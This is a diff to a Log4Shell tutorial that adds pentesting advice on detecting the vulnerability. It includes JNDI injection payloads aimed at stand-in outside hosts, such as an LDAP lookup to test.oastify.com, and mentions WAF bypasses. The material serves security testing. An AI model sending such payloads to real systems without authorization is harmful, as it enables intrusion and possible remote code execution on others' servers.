@@ -175,3 +175,5 @@ And that's it. Hope you have fun exploiting Log4J!
 
 # 4. Detecting Log4Shell
 Detect log4shell is easy. You only need to use the `${jndi:ldap://www.server-you-control.com}` as user inputs to the target server. If there is a ping back or a DNS look up for your server after the payload is sent then there is a high chance that the targe server is vulnerable. In case there is a WAF, it will block this malicious payload but there are a bunch of bypasses on Twitter for each specific WAFs that you can try.
+
+For pentesters, use the [Burp's Log4Shell Scanner extension](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f) and it will automatically replace request inputs with Log4shell payload that includes the generated burp collaborator urls. If you fancy the manual way, you can replace the payload with burp collaborator and check if there is any traffic coming to it. Example: `${jndi:ldap://test.oastify.com}`
